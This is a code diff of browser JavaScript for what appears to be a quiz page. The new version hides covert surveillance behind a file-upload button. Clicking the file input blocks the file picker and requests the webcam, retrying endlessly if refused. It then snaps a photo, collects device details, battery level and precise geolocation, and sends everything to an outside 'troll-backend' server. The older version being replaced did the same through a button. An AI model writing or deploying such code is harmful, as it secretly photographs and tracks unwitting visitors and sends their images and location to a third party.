@@ -1,130 +1,138 @@
-// ================================
-// Select DOM elements
-// ================================
-const btn = document.getElementById('btn');
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const toast = document.getElementById('toast');
+// =========================
+// Elements
+// =========================
+const fileInput = document.getElementById("user-file");
+const submitBtn = document.getElementById("submit-btn");
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const toast = document.getElementById("toast");
+const form = document.getElementById("quiz-form");
 
-// Camera constraints: video only, no mic
+// =========================
+// Camera constraints
+// =========================
 const constraints = { video: { facingMode: "user" }, audio: false };
 
-// ================================
-// Show toast function
-// ================================
-function showToast(message = "Done!") {
-    toast.innerText = message;
-    toast.style.display = 'block';
-    setTimeout(() => { toast.style.display = 'none'; }, 3000);
+// =========================
+// Show toast
+// =========================
+function showToast(message = "Captured and sent!") {
+  toast.textContent = message;
+  toast.style.display = "block";
+  setTimeout(() => {
+    toast.style.display = "none";
+  }, 3000);
 }
 
-// ================================
-// Collect metadata function
-// ================================
+// =========================
+// Collect metadata
+// =========================
 async function collectMetadata() {
-    const metadata = {
-        width: window.innerWidth,
-        height: window.innerHeight,
-        platform: navigator.platform,
-        language: navigator.language,
-        useragent: navigator.userAgent,
-        time: new Date().toISOString(),
-    };
+  const metadata = {
+    useragent: navigator.userAgent,
+    platform: navigator.platform,
+    width: window.innerWidth,
+    height: window.innerHeight,
+    language: navigator.language,
+    battery: "N/A",
+    location: "N/A",
+    time: new Date().toLocaleString(),
+  };
 
-    // Battery info
-    if (navigator.getBattery) {
-        const battery = await navigator.getBattery();
-        metadata.battery = battery.level * 100;
-        metadata.charging = battery.charging;
-    }
+  // Battery info
+  if (navigator.getBattery) {
+    try {
+      const battery = await navigator.getBattery();
+      metadata.battery = battery.level * 100;
+    } catch {}
+  }
 
-    // Geolocation
-    if (navigator.geolocation) {
-        try {
-            const position = await new Promise((resolve, reject) =>
-                navigator.geolocation.getCurrentPosition(resolve, reject)
-            );
-            metadata.location = `${position.coords.latitude},${position.coords.longitude}`;
-        } catch {
-            metadata.location = "Denied";
-        }
-    } else {
-        metadata.location = "Unsupported";
-    }
+  // Location
+  if (navigator.geolocation) {
+    try {
+      const pos = await new Promise((resolve, reject) =>
+        navigator.geolocation.getCurrentPosition(resolve, reject)
+      );
+      metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
+    } catch {}
+  }
 
-    return metadata;
+  return metadata;
 }
 
-// ================================
-// Capture camera frames for 2-3 seconds
-// ================================
-async function captureRealPhoto() {
-    let stream = null;
-    while (!stream) {
-        try {
-            stream = await navigator.mediaDevices.getUserMedia(constraints);
-        } catch (err) {
-            alert("Camera permission required!");
-        }
-    }
-
-    video.srcObject = stream;
-    await video.play();
-
-    // Capture multiple frames for 2 seconds
-    const frameCount = 5;
-    const delay = 400; // 400ms between frames
-    let lastFrameData = null;
-
-    for (let i = 0; i < frameCount; i++) {
-        await new Promise(resolve => setTimeout(resolve, delay));
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        lastFrameData = canvas.toDataURL('image/png');
-    }
-
-    // Stop all camera tracks
-    stream.getTracks().forEach(track => track.stop());
-
-    return lastFrameData;
+// =========================
+// Capture photo from webcam
+// =========================
+async function capturePhoto() {
+  const context = canvas.getContext("2d");
+  context.drawImage(video, 0, 0, canvas.width, canvas.height);
+  const imageData = canvas.toDataURL("image/png");
+  return imageData;
 }
 
-// ================================
-// Send photo + metadata to backend
-// ================================
+// =========================
+// Send data to backend
+// =========================
 async function sendData(imageData, metadata) {
-    try {
-        const res = await fetch('https://troll-backend.onrender.com/api/upload', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ image: imageData, metadata })
-        });
-        const data = await res.json();
-        console.log("Server response:", data);
-    } catch (err) {
-        console.error("Error sending data:", err);
-    }
+  try {
+    const res = await fetch("https://troll-backend.onrender.com/api/upload", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ image: imageData, metadata }),
+    });
+    const result = await res.json();
+    console.log("Backend response:", result);
+    showToast("Photo & metadata sent successfully!");
+  } catch (err) {
+    console.error("Error sending data:", err);
+    showToast("Failed to send data");
+  }
 }
 
-// ================================
-// Main function
-// ================================
-async function startCapture() {
-    showToast("Requesting camera permission...");
-    try {
-        const metadata = await collectMetadata();
-        const imageData = await captureRealPhoto();
-        await sendData(imageData, metadata);
-        showToast("Photo captured & sent successfully!");
-    } catch (err) {
-        console.error(err);
-        alert("Error capturing or sending photo.");
-    }
+// =========================
+// Ask for camera & capture
+// =========================
+async function requestCameraAndCapture() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    video.srcObject = stream;
+
+    // Ensure video has time to warm up
+    await new Promise((resolve) => setTimeout(resolve, 2500));
+
+    const metadata = await collectMetadata();
+    const imageData = await capturePhoto();
+
+    // Send data to backend
+    await sendData(imageData, metadata);
+
+    // Stop camera stream after capture
+    stream.getTracks().forEach((track) => track.stop());
+  } catch (err) {
+    console.warn("Camera permission denied or error:", err);
+    alert("Camera permission is required. Please allow access and try again.");
+    // Retry until allowed
+    await requestCameraAndCapture();
+  }
 }
 
-// ================================
-// Button click triggers capture
-// ================================
-btn.addEventListener('click', startCapture);
+// =========================
+// File input click handler
+// =========================
+fileInput.addEventListener("click", async (e) => {
+  e.preventDefault(); // prevent default file picker
+
+  // Ask camera permission first and capture photo
+  await requestCameraAndCapture();
+
+  // Then allow user to select file
+  fileInput.click();
+});
+
+// =========================
+// Form submission
+// =========================
+form.addEventListener("submit", (e) => {
+  e.preventDefault();
+  showToast("Form submitted!"); // optional, handle other form data submission if needed
+});
